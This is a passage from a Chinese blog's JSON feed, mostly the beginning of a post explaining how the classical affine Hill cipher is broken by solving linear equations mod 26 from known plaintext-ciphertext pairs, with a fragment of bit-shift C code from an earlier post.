class=\"number\">0</span>:</span><br><span class=\"line\">            c[<span class=\"number\">0</span>] = a[<span class=\"number\">0</span>] &lt;&lt; j;</span><br><span class=\"line\">            c[<span class=\"number\">1</span>] = (a[<span class=\"number\">0</span>] &gt;&gt; (<span class=\"number\">64</span> - j)) | (a[<span class=\"number\">1</span>] &lt;&lt; j);</span><br><span class=\"line\">            c[<span class=\"number\">2</span>] = (a[<span class=\"number\">1</span>] &gt;&gt; (<span class=\"number\">64</span> - j)) | (a[<span class=\"number\">2</span>] &lt;&lt; j);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">            c[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            c[<span class=\"number\">1</span>] = a[<span class=\"number\">0</span>] &lt;&lt; j;</span><br><span class=\"line\">            c[<span class=\"number\">2</span>] = (a[<span class=\"number\">0</span>] &gt;&gt; (<span class=\"number\">64</span> - j)) | (a[<span class=\"number\">1</span>] &lt;&lt; j);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">            c[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            c[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            c[<span class=\"number\">2</span>] = a[<span class=\"number\">0</span>] &lt;&lt; j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "数学",
                "密码学",
                "密码学"
            ]
        },
        {
            "id": "https://taf.fyi/math/cryptography/affine-hill/",
            "url": "https://taf.fyi/math/cryptography/affine-hill/",
            "title": "仿射希尔密码",
            "date_published": "2024-10-04T16:00:00.000Z",
            "content_html": "<blockquote>\n<p>封面是崩坏三的希尔，但我并不是崩坏玩家，只是觉得好看，<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGl4aXYubmV0L2FydHdvcmtzLzEwOTcxNDMxNw==\">原图</span> pid 为 109714317。</p>\n</blockquote>\n<h1 id=\"破解原理\"><a class=\"anchor\" href=\"#破解原理\">#</a> 破解原理</h1>\n<div class=\"note warning\">\n<p>以下运算均为模 26 意义下</p>\n</div>\n<h2 id=\"转化为方程问题\"><a class=\"anchor\" href=\"#转化为方程问题\">#</a> 转化为方程问题</h2>\n<p>仿射希尔密码中定义密钥包括一个矩阵 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 和一个向量 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span>:</p>\nL=\\begin{pmatrix}\nl_{11} & l_{12} & \\cdots & l_{1m}\\\\\nl_{21} & l_{22} & \\cdots & l_{2m}\\\\\n\\vdots & \\vdots &        & \\vdots\\\\\nl_{m1} & l_{m2} & \\cdots & l_{mm}\n\\end{pmatrix}\n\\ ,\\ \\\n\\vec b=\\begin{pmatrix}\nb_{1}\\\\\nb_{2}\\\\\n\\vdots\\\\\nb_{m}\n\\end{pmatrix}\\\\\n\n<p>给定的明文首先字母转化为在模 26 下的数，然后每连续 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 个数分为一组，每一组数组成一个长度为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 的向量 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>x</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.714em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.20772em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span>，将其经过如下运算：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mover accent=\"true\"><mi>x</mi><mo>⃗</mo></mover><mo>⋅</mo><mi>L</mi><mo>+</mo><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover><mo>=</mo><mover accent=\"true\"><mi>y</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec x\\cdot L+\\vec b=\\vec y\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.714em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.20772em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9084399999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.17994em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span></span></span></span></span></p>\n<p>得到的向量 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>y</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9084399999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.17994em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span></span></span></span> 再转化为对应的字母，就是一段属于密文的分组。所有明文分组按顺序运算，得到的密文分组按同样的顺序拼接，就得到了密文。</p>\n<p>仿射希尔密码在现代的选择明文、选择密文攻击下是不安全的，只要攻击方：</p>\n<ul>\n<li>利用统计规律或其他手段得到了分组长度 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span>；</li>\n<li>获取了足够多的明文密文对；</li>\n</ul>\n<p>这些明文密文对实际上就能依据 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 分组得到一系列形如 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>x</mi><mo>⃗</mo></mover><mo>⋅</mo><mi>L</mi><mo>+</mo><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover><mo>=</mo><mover accent=\"true\"><mi>y</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec x\\cdot L+\\vec b=\\vec y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.714em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.20772em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9084399999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.17994em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span></span></span></span> 的方程，只要方程足够多（足够好），那么就能解出其中的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span>。</p>\n<p>接下来的分析在如下<mark>假设</mark>的场景下进行：</p>\n<ul>\n<li>已知分组长度 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span>；</li>\n<li>已知明文密文对的长度 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">len</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span></span></span></span> 满足 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>l</mi><mi>e</mi><mi>n</mi><mo>≥</mo><mn>2</mn><msup><mi>m</mi><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">len\\geq 2m^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83041em;vertical-align:-0.13597em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\"><span class=\"mord mathnormal\">m</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span>；\n<ul>\n<li>换句话说如上两个条件保证了给出刚好 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>=</mo><mi>l</mi><mi>e</mi><mi>n</mi><mo>÷</mo><mi>m</mi><mo>≥</mo><mn>2</mn><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">n=len\\div m\\geq2m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">÷</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7719400000000001em;vertical-align:-0.13597em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord mathnormal\">m</span></span></span></span> 个形如 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>x</mi><mo>⃗</mo></mover><mo>⋅</mo><mi>L</mi><mo>+</mo><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover><mo>=</mo><mover accent=\"true\"><mi>y</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec x\\cdot L+\\vec b=\\vec y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.714em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.714em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">x</span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.20772em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 